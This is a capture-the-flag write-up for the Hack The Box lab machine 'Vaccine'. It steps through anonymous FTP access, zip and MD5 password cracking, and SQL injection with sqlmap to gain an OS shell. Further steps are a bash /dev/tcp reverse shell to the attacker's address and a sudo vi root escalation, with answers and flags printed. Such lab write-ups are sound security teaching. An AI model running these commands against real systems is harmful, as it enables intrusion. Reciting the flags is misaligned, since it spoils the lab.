# Vaccine (Tier 2)

## <mark style="color:blue;">Description</mark>

* **Tier&#x20;**<mark style="color:green;">**->**</mark> 2
* **Difficult** <mark style="color:green;">**->**</mark> Very Easy
* **OS** <mark style="color:green;">**->**</mark> Linux
* **Tags&#x20;**<mark style="color:green;">**->**</mark> Vulnerability Assessment / Databases / Custom Applications / Protocols\
  &#x20;              / Source Code Analysis / Apache / PostgreSQL / FTP / PHP / Reconnaissance\
  &#x20;              / Password Cracking / SUDO Exploitation / SQL Injection / Remote Code Execution\
  &#x20;              / Clear Text Credentials / Anonymous-Guest Access

<figure><img src="../../.gitbook/assets/image (496).png" alt=""><figcaption><p><a href="https://app.hackthebox.com/starting-point?tier=1">https://app.hackthebox.com/starting-point?tier=2</a></p></figcaption></figure>

## <mark style="color:blue;">Write-up</mark>

* I started doing an initial port scan using [_Nmap_](../../networks/tools-and-utilities.md#nmap)&#x20;

<pre class="language-bash" data-line-numbers><code class="lang-bash"><strong>nmap 10.129.95.174 -p- -Pn --min-rate 2500 -oN scan.txt
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (443).png" alt=""><figcaption></figcaption></figure>

***

* With this and a little research, I answered the first questions

<figure><img src="../../.gitbook/assets/image (441).png" alt=""><figcaption></figcaption></figure>

> Answer: _**ftp**_

***

<figure><img src="../../.gitbook/assets/image (444).png" alt=""><figcaption></figcaption></figure>

> Answer: _**anonymous**_

***

* Then I did an exhaustive scan to learn more about the services running on the open ports&#x20;

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>nmap 10.129.95.174 -p21,22,80 -sVC -oN serv_scan.txt
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (445).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (446).png" alt=""><figcaption></figcaption></figure>

***

* I found an HTTP service running on port 80, so I went to the browser to explore the content being deployed and found a website with just a login form. I tried using common credentials, butthey  didn't work, so I decided to search for a way to retrieve the correct credentials or to find other possible attack vectors

<figure><img src="../../.gitbook/assets/image (458).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the HTTP protocol, you can go [here](../../networks/protocols/http/)
{% endhint %}

***

* So I opted to review the FTP service that was running on port 21. We tried to log in as the default _anonymous_ user, not needing to provide any password, and it worked successfully. Then I listed the files there and found a _backup.zip_ file, which I downloaded and closed the connection

{% code overflow="wrap" lineNumbers="true" %}
```bash
ftp 10.129.95.174
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (448).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (447).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the FTP protocol, you can go [here](../../networks/protocols/ftp/)
{% endhint %}

***

* With this and a little research, I answered the next questions

<figure><img src="../../.gitbook/assets/image (449).png" alt=""><figcaption></figcaption></figure>

> Answer: _**backup.zip**_

***

<figure><img src="../../.gitbook/assets/image (450).png" alt=""><figcaption></figcaption></figure>

> Answer: _**zip2john**_

***

* Then I tried decompressing the Zip file, but it was protected with a password. I tried common and weak passwords, but it still didn't work

{% code overflow="wrap" lineNumbers="true" %}
```bash
unzip backup.zip
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (451).png" alt=""><figcaption></figcaption></figure>

***

* So I tried cracking the password, using the [_John the Ripper_](../../cryptography/tools-and-utilities.md#john-the-ripper) toolkit, in this case the _zip2john_ script to get the hash of the file. Then I checked the hash had been saved properly and cracked it using a wordlist, in this case, the well-known _rockyou.txt_ dictionary

{% code overflow="wrap" lineNumbers="true" %}
```bash
zip2john backup.zip > hash.txt
cat hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (452).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (453).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (454).png" alt=""><figcaption></figcaption></figure>

***

* I saw it worked successfully, recovering the password _741852963,_ and after trying again, I could decompress the file and extract its content&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
unzip backup.zip
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (455).png" alt=""><figcaption></figcaption></figure>

***

* Then I reviewed the two retrieved files and noticed that in the _index.php_ file, which seemed to be the source code of the login page, I found how the site was handling the credentials verification. This let me know the username I was looking for was _admin,_ and the password was hashed using MD5. So, to know the real value of the password, I went to [_Crackstation_](../../cryptography/tools-and-utilities.md#crackstation)_,_ and fortunately gave me the value of _qwerty789_ for the password

<figure><img src="../../.gitbook/assets/image (456).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (457).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about MD5 and other hashing methods, you can go [here](../../cryptography/fundamental-concepts/hashing-wip/hashing-wip.md)
{% endhint %}

***

* Then I went to the website again and tried to log in with these leaked credentials, seeing how it worked, and having access to a _Car Catalogue_ panel

<figure><img src="../../.gitbook/assets/image (459).png" alt=""><figcaption></figcaption></figure>

***

* With this and a little research, I answered the next questions

<figure><img src="../../.gitbook/assets/image (460).png" alt=""><figcaption></figcaption></figure>

> Answer: _**qwerty789**_

***

<figure><img src="../../.gitbook/assets/image (461).png" alt=""><figcaption></figcaption></figure>

> Answer: _**--os-shell**_

***

* Exploring the site, the only option that I had was a search bar, so I tried using it and noticed that the queries I was putting in were being reflected in the URL. So I tried doing some XSS testing, but it didn't work, so maybe this wasn't the attack vector we were looking for

<figure><img src="../../.gitbook/assets/image (463).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (464).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the Cross-Site Scripting (XSS) technique, you can go [here](../../web-exploitation/broken-access-control/cross-site-scripting.md)
{% endhint %}

***

* So, as I saw it was working based on queries, maybe the page was using SQL internally to retrieve the data from a database. So I tried putting an `'` as input to see if this triggered an error that could give me any clue, and fortunately it worked, giving information about the SQL query. Also, I did some basic SQLi tests to confirm the vulnerability, and in fact, it was working

<figure><img src="../../.gitbook/assets/image (466).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (468).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about SQL Injection (SQLi), you can go [here](../../database-attacks/specific-scenarios/sql-injection/).
{% endhint %}

***

* So to speed up the process of abusing this vulnerability, I used [_sqlmap_](../../database-attacks/tools-and-utilities.md#sqlmap) specifying the integrated option it has to try to obtain a shell on the target through the database. But after trying, it didn't give me any results, so maybe I was missing something important

{% code overflow="wrap" lineNumbers="true" %}
```bash
sqlmap -u 'http://10.129.95.174/dashboard.php?search=a' --os-shell
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (470).png" alt=""><figcaption></figcaption></figure>

***

* To make sure, I tried looking at the petition sent when I used the search engine, using [_FoxyProxy_ ](../../web-exploitation/tools-and-utilities.md#foxyproxy)and [_Burp Suite_](../../web-exploitation/tools-and-utilities.md#burp-suite). By surprise, I found a session cookie was being sent, so I needed to specify this to _sqlmap_ to work properly. After doing this and retrying the attack, I successfully got a shell from the system as the database user

{% code overflow="wrap" lineNumbers="true" %}
```bash
sqlmap -u 'http://10.129.95.174/dashboard.php?search=a' --os-shell --cookie "PHPSESSID=7c81be8esvtsdivfi47afasnoq"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (475).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

***

* As the shell given by _sqlmap_ is limited, I tried gaining a Reverse Shell to my machine through the _os-shell_, setting a [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener, and sending the connection to the specified port. It worked properly, and after catching the connection, I sanitized the terminal to interact better with it

{% code overflow="wrap" lineNumbers="true" %}
```bash
# On our terminal
nc -nvlp 4444

# On the os-shell
bash -c "bash -i >& /dev/tcp/10.10.14.117/4444 0>&1
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (480).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (481).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (482).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about how to create a script for a Reverse Shell, you can go [here](../../scripting/reverse-shell.md), and to learn about the sanitization process, you can go [here](../../linux/useful-shell-resources.md#tty-sanitization)
{% endhint %}

***

* As the Reverse Shell was still linked to the _sqlmap_ connection, it usually dropped down, and I had to redo the process, so I needed to create persistence in the session to work properly. To do this, I started searching in the files from the server in the standard folder _/var/www/html_. There, I found some source files from the web, and looking through them, we found that in the _dashboard.php_ file, the password for the database user was also being leaked

<figure><img src="../../.gitbook/assets/image (488).png" alt=""><figcaption><p>snipept</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (483).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

***

* So to leverage this, I tried connecting with those credentials via SSH, and fortunately it worked, doing the sanitization process again to work more comfortably

<figure><img src="../../.gitbook/assets/image (484).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (485).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the SSH protocol, you can go [here](../../networks/protocols/ssh.md)
{% endhint %}

***

* Then, looking at the folder I was in, I listed the contents and found a _user.txt_ file from which I retrieved the user flag

<figure><img src="../../.gitbook/assets/image (490).png" alt=""><figcaption></figcaption></figure>

***

* Now, what was left was to escalate privileges, so I used the command `sudo -l` to look for which privileged execution permissions this user had, and found that it had privileges for using the _vi_ text editor over a specific file

<figure><img src="../../.gitbook/assets/image (489).png" alt=""><figcaption></figcaption></figure>

***

* With this and the previously found user flag, I answered the next questions

<figure><img src="../../.gitbook/assets/image (494).png" alt=""><figcaption></figcaption></figure>

> Answer: _**vi**_

***

<figure><img src="../../.gitbook/assets/image (495).png" alt=""><figcaption></figcaption></figure>

> Answer: _**ec9b13ca4d6229cd5cc1e09980965bf7**_

***

* Knowing this, I used the `vi` command with `sudo` knowing that internally, _vi_ gives the option to execute external commands using the `:!` operator. So, I invoked a bash with privileges, which worked perfectly, and gained a shell as the _root_ user

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

# Inside vi
:!/bin/bash
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (491).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (492).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the `sudo` abuse for privilege escalation, you can go [here](../../penetration-testing/process-stages/post-exploitation/privilege-escalation/linux-privilege-escalation.md#abusing-sudo-execution-permissions)
{% endhint %}

***

* Finally, I went to the _/root_ folder to look at its content, noticing a _root.txt_ file, to finally read its content, and found the root flag&#x20;

<figure><img src="../../.gitbook/assets/image (493).png" alt=""><figcaption></figcaption></figure>

***

* With this, I got the root flag and pwned the machine

<figure><img src="../../.gitbook/assets/image (245) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**dd6e058e814260bc70e9bbdef2715849**_
